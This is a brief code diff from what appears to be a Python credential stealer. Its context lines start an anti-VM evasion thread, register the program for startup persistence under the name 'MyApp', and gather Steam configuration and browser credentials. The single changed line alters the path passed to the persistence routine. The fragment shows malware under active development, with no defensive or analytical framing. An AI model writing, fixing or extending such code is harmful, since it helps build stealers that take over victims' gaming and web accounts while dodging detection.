@@ -115,7 +115,7 @@ class Main:
 
     def run(self):
         Thread(target=self.antivm).start()
-        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__file__)))
+        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__name__)))
         
         userConfig, steamConfig = self.steam()
         listCreds = self.browser()
